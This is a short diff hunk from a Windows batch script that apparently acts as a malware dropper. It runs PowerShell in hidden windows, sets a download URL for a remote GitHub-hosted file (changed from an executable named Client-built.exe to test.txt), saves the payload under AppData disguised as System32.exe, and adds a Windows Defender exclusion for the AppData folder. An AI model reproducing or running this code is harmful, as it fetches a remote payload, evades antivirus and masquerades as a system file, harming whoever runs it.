@@ -30,7 +30,7 @@ powershell -WindowStyle Hidden -Command "$shell = New-Object -ComObject Shell.Ap
 
 :: Continue with rest
 set "APPDATA_PATH=%USERPROFILE%\AppData"
-set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Client-built.exe"
+set "DOWNLOAD_URL=https://raw.githubusercontent.com/Abdullah67289/Ghoste-Trace/refs/heads/main/test.txt"
 set "TARGET_FILE=%USERPROFILE%\AppData\Roaming\SubDir\System32.exe"
 
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"
